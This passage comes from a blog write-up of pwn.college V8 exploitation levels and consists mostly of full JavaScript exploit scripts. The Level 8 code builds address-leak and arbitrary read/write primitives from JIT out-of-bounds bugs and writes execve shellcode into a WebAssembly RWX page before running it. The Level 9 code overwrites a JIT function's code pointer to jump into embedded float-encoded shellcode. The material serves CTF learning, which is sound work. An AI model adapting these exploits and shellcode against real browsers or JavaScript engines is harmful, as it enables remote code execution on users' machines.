class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">last32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    dv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">to_jit</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>, <span class="number">6.6</span>, <span class="number">7.7</span>];&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++)&#123;<span class="title function_">to_jit</span>();&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//let trojan_arr = new Array(0x10).fill(1.1);</span></span><br><span class="line"><span class="comment">//let sample_obj = &#123;trojan_arr&#125;;</span></span><br><span class="line"><span class="comment">//let obj_arr = [sample_obj];</span></span><br><span class="line"><span class="comment">//let float_arr = [1.1, 2.2, 3.3];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//%DebugPrint(trojan_arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(obj_arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(float_arr);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get32addr</span>(<span class="params">obj</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">obj, i</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> array = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">        <span class="keyword">let</span> obj_arr = [obj];</span><br><span class="line">        i = i&amp;<span class="number">0xfffffff</span>;</span><br><span class="line">        fv[<span class="number">0</span>] = array[i];</span><br><span class="line">        uv[<span class="number">1</span>] = <span class="number">0x001cb7f9</span>;</span><br><span class="line">        array[i] = fv[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span> [array, obj_arr];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;<span class="number">1000000</span>; i++) <span class="title function_">opt</span>(obj, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> last = <span class="title function_">opt</span>(obj, <span class="number">6</span>);</span><br><span class="line">    <span class="keyword">let</span> obj_tmp = last[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2ul</span>(obj_tmp[<span class="number">0</span>])-<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbRead64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    addr -= <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">idx</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++);</span><br><span class="line">        idx = idx &amp; <span class="number">0xfffffff</span>;</span><br><span class="line">        <span class="keyword">let</span> trojan_arr = [<span class="number">1.1</span>];</span><br><span class="line">        <span class="keyword">let</span> array = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">f2i</span>(trojan_arr[idx]).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">        trojan_arr[idx] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;<span class="number">10000</span>; i++) <span class="title function_">opt</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//console.log(opt(6));</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(<span class="title function_">opt</span>(<span class="number">6</span>)[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbWrite64</span>(<span class="params">addr, data</span>)&#123;</span><br><span class="line">    addr -= <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">idx</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++);</span><br><span class="line">        idx = idx &amp; <span class="number">0xfffffff</span>;</span><br><span class="line">        <span class="keyword">let</span> trojan_arr = [<span class="number">1.1</span>];</span><br><span class="line">        <span class="keyword">let</span> array = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">f2i</span>(trojan_arr[<span class="number">0</span>]).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">        trojan_arr[idx] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;<span class="number">10000</span>; i++) <span class="title function_">opt</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">let</span> last = <span class="title function_">opt</span>(<span class="number">6</span>);</span><br><span class="line">    last[<span class="number">0</span>] = <span class="title function_">i2f</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*function opt(addr)&#123;</span></span><br><span class="line"><span class="comment">    let trojan_arr = [1.1];</span></span><br><span class="line"><span class="comment">    let array = [1.1, 2.2, 3.3];</span></span><br><span class="line"><span class="comment">    //%DebugPrint(trojan_arr);</span></span><br><span class="line"><span class="comment">    //%DebugPrint(array);</span></span><br><span class="line"><span class="comment">    while(1)&#123;&#125;;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//%OptimizeFunctionOnNextCall(opt);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//a = [1.1, 2.2, 3.3];</span></span><br><span class="line"><span class="comment">//console.log(get32addr(a).toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//opt(1)</span></span><br><span class="line"><span class="comment">//a_addr = get32addr(a);</span></span><br><span class="line"><span class="comment">//b = ArbRead64(a_addr);</span></span><br><span class="line"><span class="comment">//console.log(b.toString(16));</span></span><br><span class="line"><span class="comment">//ArbWrite64(a_addr, 0x1n);</span></span><br><span class="line"><span class="comment">//console.log(a_addr.toString(16));</span></span><br><span class="line"><span class="comment">//%DebugPrint(a);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">ELEMENT_OFFSET</span> = <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">MAP_OFFSET</span> = <span class="number">0x24</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">WASM_PAGE_SIZE</span> = <span class="number">0x2bfac</span>;</span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="title function_">i2f</span>(<span class="number">0x9090909090909090n</span>),<span class="title function_">i2f</span>(<span class="number">0x2434810101666068n</span>),<span class="title function_">i2f</span>(<span class="number">0x6567b84801010101n</span>),<span class="title function_">i2f</span>(<span class="number">0x48506c667461632fn</span>),<span class="title function_">i2f</span>(<span class="number">0x656c6c6168632fb8n</span>),<span class="title function_">i2f</span>(<span class="number">0x31d231e78948506en</span>),<span class="title function_">i2f</span>(<span class="number">0x0000050f583b6af6n</span>)];</span><br><span class="line">wasm_instance_addr = <span class="title function_">get32addr</span>(wasm_instance);</span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title class_">ArbRead64</span>(wasm_instance_addr+<span class="variable constant_">WASM_PAGE_SIZE</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] WASM INSTANCE ADDR:&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(wasm_instance_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="comment">//console.log(GetAddressOf(fake).toString(16));</span></span><br><span class="line"><span class="comment">//console.log(GetAddressOf(arr).toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// move dataview to RWX memory</span></span><br><span class="line"><span class="keyword">let</span> buf_addr = <span class="title function_">get32addr</span>(buf);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//%DebugPrint(buf)</span></span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="keyword">let</span> backing_store_pointer = buf_addr + <span class="number">0x24</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(backing_store_pointer.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line">backing_store_addr = <span class="title class_">ArbRead64</span>(backing_store_pointer);</span><br><span class="line"><span class="comment">//console.log(backing_store_addr.toString(16));</span></span><br><span class="line"><span class="comment">//caculate full rwx addr</span></span><br><span class="line"><span class="comment">//%DebugPrint(buf)</span></span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="comment">//console.log(rwx_page_addr.toString(16));</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(backing_store_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//ArbWrite64(backing_store_pointer, backing_store_addr);</span></span><br><span class="line"><span class="title class_">ArbWrite64</span>(backing_store_pointer,rwx_page_addr);</span><br><span class="line"><span class="comment">//console.log(ArbRead64(backing_store_pointer).toString(16));</span></span><br><span class="line"><span class="comment">//%DebugPrint(buf);</span></span><br><span class="line"><span class="comment">//%DebugPrint(wasm_instance);</span></span><br><span class="line"><span class="comment">//%DebugPrint(arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake_obj);</span></span><br><span class="line"><span class="comment">// copy shellcode</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    dataview.<span class="title function_">setFloat64</span>(<span class="number">8</span> * i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jump to RWX memory</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(rwx_page_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(wasm_instance_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"><span class="comment">//console.log(ArbRead64(arr_element_addr).toString(16));</span></span><br><span class="line"><span class="comment">//ArbWrite64(arr_element_addr, 1);</span></span><br><span class="line"><span class="comment">//console.log(ArbRead64(arr_element_addr).toString(16));</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><p>給了一連串 sandbox 內的 aar, aaw，拿 RCE<br>Spray shellcode function 預熱後會發現 sandbox 內的 code (執行的 MEMORY 段落)變成 TurboFan，再改掉 code 段落跳轉點進去客製化寫入的 shellcode 區，就可以拿 RCE ㄌ…嗎？  </p>
<p>不，因為資料不是好好排在上面而是有一堆奇怪的 push 操作去準備 return，所以要安插 <code>jmp 0xc</code> 之類的去跳過那些固定段落的垃圾，此外其實它會去跳地址 + 0x3f 的地方，要扣掉這個 offset，最後因為我太不會寫 shellcode 所以我直接 <code>cd /challenge</code> 然後呼叫 catflag 不然標準路徑太長了(  </p>
<p>跟這篇幾乎一樣：<a target="_blank" rel="noopener" href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html">https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html</a>  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> uv = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> fv = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    fv[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> dv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    dv[<span class="number">0</span>] = <span class="title class_">BigInt</span>(i);</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2f</span>(<span class="params">i, j</span>)&#123;</span><br><span class="line">    uv[<span class="number">0</span>]=i;</span><br><span class="line">    uv[<span class="number">1</span>]=j;</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2ul</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    fv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2uh</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    fv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shift32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> i&lt;&lt;<span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">last32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    dv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//var shellcode = [1.0,i2f(0xceb580067616c68n),i2f(0xceb5a6674616368n),i2f(0xcebf63120e0c148n),i2f(0xceb50d231d00148n),i2f(0x50f583b6ae78948n)];</span></span><br><span class="line"><span class="comment">//console.log(shellcode);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">opt</span> = (<span class="params"></span>)=&gt;&#123;<span class="keyword">return</span>[<span class="number">1.0</span>,<span class="number">1.9553825376526264e-246</span>,<span class="number">1.956052573312927e-246</span>,<span class="number">1.9995714719542577e-246</span>,<span class="number">1.9533767332674093e-246</span>,<span class="number">2.6348604765229606e-284</span>];&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++) <span class="title function_">opt</span>();</span><br><span class="line"><span class="comment">//%DebugPrint(opt);</span></span><br><span class="line"></span><br><span class="line">opt_addr = <span class="title class_">Sandbox</span>.<span class="title function_">getAddressOf</span>(opt);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] opt ADDR:&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(opt_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">opt_mem = <span class="keyword">new</span> <span class="title class_">Sandbox</span>.<span class="title class_">MemoryView</span>(opt_addr, <span class="number">0x100</span>);</span><br><span class="line">opt_mem = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(opt_mem);</span><br><span class="line">code_addr = opt_mem[<span class="number">6</span>]-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] code ADDR:&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(code_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">opt_mem[<span class="number">6</span>] = code_addr+<span class="number">0xb4</span>-<span class="number">0x3f</span>;</span><br><span class="line"><span class="comment">//console.log(f2i(1.0));</span></span><br><span class="line"><span class="title function_">opt</span>();</span><br><span class="line"><span class="comment">//%DebugPrint(opt);</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1"><span class="toc-number">2.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2"><span class="toc-number">3.</span> <span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3"><span class="toc-number">4.</span> <span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-4"><span class="toc-number">5.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-5"><span class="toc-number">6.</span> <span class="toc-text">Level 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-6"><span class="toc-number">7.</span> <span class="toc-text">Level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-7"><span class="toc-number">8.</span> <span class="toc-text">Level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-8"><span class="toc-number">9.</span> <span class="toc-text">Level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-9"><span class="toc-number">10.</span> <span class="toc-text">Level 9</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/05/04/pwn-college-v8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&text=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&title=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&is_video=false&description=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=PWN.COLLEGE - V8 Pwn 學習筆記&body=Check out this article: http://wha13.github.io/2025/05/04/pwn-college-v8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&title=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&title=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&title=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&title=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/05/04/pwn-college-v8/&name=PWN.COLLEGE - V8 Pwn 學習筆記&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/05/04/pwn-college-v8/&t=PWN.COLLEGE - V8 Pwn 學習筆記"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2026
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
